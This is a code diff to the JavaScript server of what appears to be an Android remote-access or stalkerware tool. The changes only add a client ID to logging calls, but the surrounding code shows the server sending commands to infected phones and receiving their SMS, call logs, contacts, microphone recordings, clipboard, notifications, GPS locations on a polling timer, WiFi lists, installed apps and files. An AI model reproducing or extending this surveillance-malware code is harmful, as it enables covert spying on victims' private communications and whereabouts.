@@ -82,7 +82,7 @@ class Clients {
         if (this.ignoreDisconnects[clientID]) {
             delete this.ignoreDisconnects[clientID];
         } else {
-            logManager.log(CONST.logTypes.info, clientID + " Disconnected",user).then()
+            logManager.log(CONST.logTypes.info, clientID + " Disconnected",user,clientID).then()
             // this.db.maindb.get('clients').find({clientID}).assign({
             //     lastSeen: new Date(),
             //     isOnline: false,
@@ -126,14 +126,14 @@ class Clients {
         let socket = this.clientConnections[clientID];
         let client = await this.getClientDatabase(clientID);
 
-        logManager.log(CONST.logTypes.info, clientID + " Connected",client.user).then()
+        logManager.log(CONST.logTypes.info, clientID + " Connected",client.user,clientID).then()
         socket.on('disconnect', () => this.clientDisconnect(clientID,client.user));
 
         // Run the queued requests for this client
         let clientQue = client.CommandQue;
 
         if (clientQue.length !== 0) {
-            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands",client.user).then();
+            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands",client.user,clientID).then();
             clientQue.forEach((command) => {
                 let uid = command.uid;
                 this.sendCommand(clientID, command.type, command, async (error) => {
@@ -148,7 +148,7 @@ class Clients {
                     {
                         // Hopefully we'll never hit this point, it'd mean the client connected then immediately disconnected, how weird!
                         // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ
-                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed",client.user).then();
+                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed",client.user,clientID).then();
                     }
                 })
             })
@@ -214,13 +214,13 @@ class Clients {
                         {currentFolder: data.list}
                     );
 
-                    logManager.log(CONST.logTypes.success, "File List Updated",client.user).then();
+                    logManager.log(CONST.logTypes.success, "File List Updated",client.user,clientID).then();
                 } else {
                     // bummer, something happened
                 }
             } else if (data.type === "download") {
                 // Ayy, time to recieve a file!
-                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID,client.user).then();
+                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID,client.user,clientID).then();
 
 
                 let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
@@ -252,7 +252,7 @@ class Clients {
                             {$push: {downloads: updateData}}
                         );
 
-                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved",client.user).then();
+                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved",client.user,clientID).then();
                     } else console.log(error); // not ok
                 })
             } else if (data.type === "error") {
@@ -285,7 +285,7 @@ class Clients {
                             newCount++;
                         }
                     }
-                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls",client.user).then();
+                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls",client.user,clientID).then();
                 }
             }
 
@@ -311,16 +311,16 @@ class Clients {
                             newCount++
                         }
                     }
-                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages",client.user).then();
+                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages",client.user,clientID).then();
                 }
             } else if (typeof data === "boolean") {
-                logManager.log(CONST.logTypes.success, clientID + " SENT SMS",client.user).then();
+                logManager.log(CONST.logTypes.success, clientID + " SENT SMS",client.user,clientID).then();
             }
         });
 
         socket.on(CONST.messageKeys.mic, (data) => {
             if (data.file) {
-                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID,client.user).then();
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID,client.user,clientID).then();
 
                 let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                 let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
@@ -382,10 +382,10 @@ class Clients {
                             }}}
                 );
 
-                logManager.log(CONST.logTypes.success, clientID + " GPS Updated",client.user).then();
+                logManager.log(CONST.logTypes.success, clientID + " GPS Updated",client.user,clientID).then();
             } else {
-                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data",client.user).then();
-                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data),client.user).then();
+                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data",client.user,clientID).then();
+                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data),client.user,clientID).then();
             }
         });
 
@@ -425,7 +425,7 @@ class Clients {
                     );
                     newCount++
 
-                    logManager.log(CONST.logTypes.info, clientID + " ClipBoard Received",client.user).then();
+                    logManager.log(CONST.logTypes.info, clientID + " ClipBoard Received",client.user,clientID).then();
                 }
 
 
@@ -446,7 +446,7 @@ class Clients {
 
                 client.notificationLog.push(data)
                // dbNotificationLog.push(data).write();
-                logManager.log(CONST.logTypes.info, clientID + " Notification Received",client.user).then();
+                logManager.log(CONST.logTypes.info, clientID + " Notification Received",client.user,clientID).then();
             }
         });
 
@@ -477,7 +477,7 @@ class Clients {
                             newCount++;
                         }
                     }
-                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added",client.user).then();
+                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added",client.user,clientID).then();
                 }
             }
 
@@ -520,7 +520,7 @@ class Clients {
                             );
                         }
                     }
-                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found",client.user).then();
+                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found",client.user,clientID).then();
                 }
             }
         });
@@ -531,7 +531,7 @@ class Clients {
                 {clientID: clientID},
                 {$push: {enabledPermissions: data.permissions}}
             );
-            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated",client.user).then();
+            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated",client.user,clientID).then();
         });
 
         socket.on(CONST.messageKeys.installed, async (data) => {
@@ -540,7 +540,7 @@ class Clients {
                 {clientID: clientID},
                 {$push: {apps:  data.apps}}
             );
-            logManager.log(CONST.logTypes.success, clientID + " Apps Updated",client.user).then();
+            logManager.log(CONST.logTypes.success, clientID + " Apps Updated",client.user,clientID).then();
         });
     }
 
@@ -633,7 +633,7 @@ class Clients {
                     commandPayload.type = commandID;
                     if (clientID in this.clientConnections) {
                         let socket = this.clientConnections[clientID];
-                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID,client.user).then();
+                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID,client.user,clientID).then();
                         socket.emit('order', commandPayload)
                         return cb(false, 'Requested');
                     } else {
@@ -719,7 +719,7 @@ class Clients {
 
         if (gpsSettings.updateFrequency > 0) {
             this.gpsPollers[clientID] = setInterval(() => {
-                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS",clientDB.user).then();
+                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS",clientDB.user,clientID).then();
                 this.sendCommand(clientID, '0xLO')
             }, gpsSettings.updateFrequency * 1000);
         }
